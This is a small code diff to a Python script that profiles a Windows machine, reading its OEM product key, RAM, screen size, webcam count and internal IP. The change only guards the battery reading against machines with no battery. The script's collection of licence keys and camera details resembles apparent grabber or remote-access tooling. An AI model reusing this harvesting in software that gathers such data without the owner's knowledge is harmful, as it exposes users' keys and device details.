@@ -66,7 +66,7 @@ system = str(subprocess.check_output('wmic os get Caption /format:list').decode(
 output = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True).decode().strip()
 product_key = str(output.split('\n', 1)[-1].strip())
 ram = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
-power = str(psutil.sensors_battery().percent)
+power = str(psutil.sensors_battery().percent) if psutil.sensors_battery() is not None else "No battery"
 screen = str(pyautogui.size())
 webcams_count = len(pygame.camera.list_cameras())
 internal_ip = str(socket.gethostbyname(socket.gethostname()))
